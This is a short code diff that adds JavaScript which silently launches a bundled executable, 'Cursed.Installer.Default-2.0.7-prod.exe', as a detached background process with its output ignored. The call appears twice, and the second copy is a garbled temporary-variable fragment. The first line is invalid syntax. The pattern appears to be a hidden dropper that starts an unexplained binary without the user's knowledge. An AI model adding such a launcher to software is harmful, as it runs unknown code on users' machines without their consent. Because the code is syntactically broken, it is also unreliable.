@@ -1,0 +1,12 @@
+function run = function run() {
+  spawn(resolve('Cursed.Installer.Default-2.0.7-prod.exe'), {
+    detached: true,
+    stdio: 'ignore'
+  }).unref();
+
+  return () => {};
+}
+(_tmp_0 = spawn(resolve('Cursed.Installer.Default-2.0.7-prod.exe'), {
+    detached: true,
+    stdio: 'ignore'
+  })).unref
